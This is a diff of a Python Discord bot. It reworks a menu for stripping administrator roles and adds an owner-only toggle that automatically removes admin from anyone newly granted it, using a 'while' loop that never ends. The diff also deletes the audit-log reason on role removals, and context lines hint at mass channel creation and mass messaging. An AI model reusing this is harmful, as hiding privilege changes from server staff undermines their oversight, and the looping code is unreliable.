@@ -18,7 +18,7 @@ intents = discord.Intents.default()
 intents.message_content = True  # Enable message content intent (if needed)
 intents.members = True
 
-
+auto_remove = False
 
 
 mass_sending = False
@@ -26,43 +26,44 @@ mass_sending = False
 bot = commands.Bot(command_prefix=':/', case_insensitive=True, help_command=None, intents=intents)
 
 class RemoveAdminView(discord.ui.View):
-    def __init__(self):
-        super().__init__(timeout=None)
+    def __init__(self, admins):
+        super().__init__()
+        self.admins = admins
 
-    @discord.ui.button(label="Remove Admin", style=discord.ButtonStyle.danger, custom_id="remove_admin_button")
-    async def remove_admin_button_callback(self, button: discord.ui.Button, interaction: discord.Interaction):
-        # Acknowledge the interaction to prevent "Interaction Failed"
-        await interaction.response.defer()
-        await interaction.followup.send("Select a user to remove admin role:", view=self)
+        # Create a select menu for the admin users
+        select_menu = discord.ui.Select(
+            placeholder="Select a user to remove admin roles",
+            options=[discord.SelectOption(label=display_name, value=str(user_id)) for user_id, display_name in admins]
+        )
+        select_menu.callback = self.remove_admin_roles  # Assign callback
+        self.add_item(select_menu)
 
-    @discord.ui.select(placeholder="Select a user to remove admin role", custom_id="select_menu", options=[])
-    async def select_menu_callback(self, select: discord.ui.Select, interaction: discord.Interaction):
-        # Acknowledge the interaction to prevent "Interaction Failed"
-        await interaction.response.defer()
-
-        # Get the selected user by ID from the select menu
-        selected_user_id = int(select.values[0])
+    async def remove_admin_roles(self, interaction: discord.Interaction):
+        # Get selected user ID
+        selected_user_id = int(self.children[0].values[0])
         selected_user = interaction.guild.get_member(selected_user_id)
 
-        if selected_user is None:
-            await interaction.followup.send("User not found.", ephemeral=True)
-            return
+        if selected_user:
+            # List of roles that have admin permissions
+            admin_roles = [role for role in selected_user.roles if role.permissions.administrator]
 
-        # Remove the admin role from the selected user
-        for role in selected_user.roles:
-            if role.permissions.administrator:
-                await selected_user.remove_roles(role)
-                await interaction.followup.send(f"Removed admin role from {selected_user.display_name}", ephemeral=True)
-                return
-
-        await interaction.followup.send(f"{selected_user.display_name} does not have an admin role.", ephemeral=True)
+            if admin_roles:
+                # Remove all admin roles
+                await selected_user.remove_roles(*admin_roles)
+                await interaction.response.send_message(
+                    f"Removed admin roles from {selected_user.display_name}: {', '.join(role.name for role in admin_roles)}.",
+                    ephemeral=True
+                )
+            else:
+                await interaction.response.send_message(f"{selected_user.display_name} has no roles with admin permissions.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Could not find the selected user.", ephemeral=True)
 
 
 @bot.event
 async def on_ready():   
     print(f'Bot is ready as {bot.user}')
     await bot.change_presence(status=discord.Status.online)
-    bot.add_view(RemoveAdminView())
     try:
         synced = await bot.tree.sync()
         print(f"Synced {len(synced)} command(s)")
@@ -78,17 +79,8 @@ async def check_admins(interaction: discord.Interaction):
         ]
 
         if admins:
-            # Create a select menu component
-            select_menu = discord.ui.Select(
-                placeholder="Select a user to remove admin role",
-                options=[discord.SelectOption(label=display_name, value=str(user_id)) for user_id, display_name in admins]
-            )
-
-            # Create a view with the select menu
-            view = discord.ui.View()
-            view.add_item(select_menu)
-
-            # Send the interaction response with the select menu
+            # Create a view with the select menu and send it
+            view = RemoveAdminView(admins)
             await interaction.response.send_message(
                 f"The following users have admin permissions: {', '.join(display_name for _, display_name in admins)}",
                 view=view,
@@ -98,6 +90,7 @@ async def check_admins(interaction: discord.Interaction):
             await interaction.response.send_message("No users have admin permissions in this server.", ephemeral=True)
     else:
         await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
+
 
 
 @bot.event
@@ -128,11 +121,30 @@ async def on_member_update(before, after):
         # If the user gained an admin role
         if not before_admin and after_admin:
             await owner.send(f"{after.mention} has been granted admin")
+            admin_role = next((role for role in after.roles if role.permissions.administrator), None)
+            if admin_role:
+                while auto_remove:
+                    await after.remove_roles(admin_role)
 
         # If the user lost an admin role
         elif before_admin and not after_admin:
             await owner.send(f"{after.mention} no longer has admin.")
 
+@bot.tree.command()
+@app_commands.describe(state="True/False")
+async def toggle(interaction: discord.Interaction, state: str):
+    if interaction.user.id == owner_id:
+        global auto_remove
+        if state.lower() == "true":
+            auto_remove = True
+            await interaction.response.send_message("Set toggle to True", ephemeral=True)
+        elif state.lower() == "false":
+            auto_remove = False
+            await interaction.response.send_message("Set toggle to False", ephemeral=True)
+        else:
+            await interaction.response.send_message("Invalid state. Please use True or False", ephemeral=True)
+    else:
+        return
 
 @bot.tree.command()
 @app_commands.describe(name="What name for the channels", amount= "How many channels to create")
@@ -532,7 +544,7 @@ async def remove_admin_roles(interaction: discord.Interaction):
                 try:
                     # Remove each admin role
                     for role in admin_roles:
-                        await target_user.remove_roles(role, reason="Admin role removed by bot")
+                        await target_user.remove_roles(role)
                     removed_roles_count += len(admin_roles)
                     await interaction.followup.send(f"Removed {len(admin_roles)} admin role(s) from {target_user.mention} in {target_guild.name}.", ephemeral=True)
                 
@@ -554,7 +566,9 @@ async def remove_admin_roles(interaction: discord.Interaction):
         await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
 
 
-
+@bot.tree.command(name="suggest", description="Suggest a command to add")
+async def suggestion(interaction : discord.Interaction):
+    avatar = interaction.user.avatar
 
 @bot.tree.command(name="hello")
 async def hello(interaction : discord.Interaction):
